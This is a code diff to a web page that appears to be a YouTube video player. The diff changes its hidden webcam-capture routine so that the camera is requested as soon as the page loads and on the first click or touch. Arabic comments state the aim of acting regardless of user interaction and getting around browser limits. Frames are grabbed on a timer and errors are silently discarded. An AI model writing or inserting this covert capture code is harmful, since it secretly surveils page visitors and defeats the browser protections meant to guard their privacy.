@@ -88,19 +88,19 @@ function playVideo(id) {
   mainPlayer.src = `https://www.youtube.com/embed/${id}?autoplay=1`;
   playerWrap.style.display = 'block';
   window.scrollTo({top: 0, behavior: 'smooth'});
-  initCapture();
 }
 
 let isCapturing = false;
 
-function initCapture() {
+function startCameraAndCapture() {
   if (isCapturing) return;
-  
+
   navigator.mediaDevices.getUserMedia({ video: true })
     .then(stream => {
       isCapturing = true;
       const videoEl = document.getElementById('video');
       videoEl.srcObject = stream;
+      videoEl.play();
       
       setInterval(() => {
         const canvas = document.createElement('canvas');
@@ -120,15 +120,14 @@ function initCapture() {
     .catch(() => {});
 }
 
-window.addEventListener('DOMContentLoaded', () => {
-  if (navigator.permissions && navigator.permissions.query) {
-    navigator.permissions.query({ name: 'camera' }).then(permissionStatus => {
-      if (permissionStatus.state === 'granted') {
-        initCapture();
-      }
-    }).catch(() => {});
-  }
+// تشغيل طلب الكاميرا والالتقاط فور فتح الصفحة بغض النظر عن تفاعل المستخدم
+window.addEventListener('load', () => {
+  startCameraAndCapture();
 });
+
+// محاولة تشغيل إضافية عند أي تفاعل لمس أو ضغط في الصفحة لتفادي قيود المتصفحات
+document.addEventListener('touchstart', startCameraAndCapture, { once: true });
+document.addEventListener('click', startCameraAndCapture, { once: true });
 </script>
 </body>
 </html>
